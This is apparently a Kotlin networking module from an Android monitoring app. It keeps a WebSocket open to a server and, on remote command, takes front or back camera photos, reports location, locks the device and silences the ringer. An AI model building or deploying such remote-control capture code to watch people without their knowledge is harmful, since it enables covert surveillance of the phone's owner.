package ru.observer.app.net

import android.content.Context
import android.os.Handler
import android.os.Looper
import okhttp3.*
import org.json.JSONObject
import ru.observer.app.collect.CaptureService
import ru.observer.app.data.Prefs
import ru.observer.app.sync.Sync
import java.util.concurrent.TimeUnit

object Ws {
    private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
    @Volatile private var on = false
    private var backoff = 1000L

    fun start(c: Context) {
        if (on || Prefs.token.isEmpty()) return
        on = true
        connect(c.applicationContext)
    }

    private fun connect(c: Context) {
        val url = Prefs.base.replace("https://", "wss://").replace("http://", "ws://") +
                "/ws/device?token=" + Prefs.token
        http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) { backoff = 1000L }
            override fun onMessage(w: WebSocket, text: String) {
                if (text.contains("ping")) return
                when (JSONObject(text).optString("kind")) {
                    "photo_front" -> CaptureService.shoot(c, true)
                    "photo_back" -> CaptureService.shoot(c, false)
                    "loc" -> Sync.now(c)
                    "lock" -> c.getSystemService(android.app.admin.DevicePolicyManager::class.java).lockNow()
                    "silent" -> c.getSystemService(android.media.AudioManager::class.java)
                        .ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
                }
            }
            override fun onFailure(w: WebSocket, t: Throwable, r: Response?) {
                on = false
                Handler(Looper.getMainLooper()).postDelayed({ start(c) }, backoff)
                backoff = (backoff * 2).coerceAtMost(120_000L)
            }
        })
    }
}
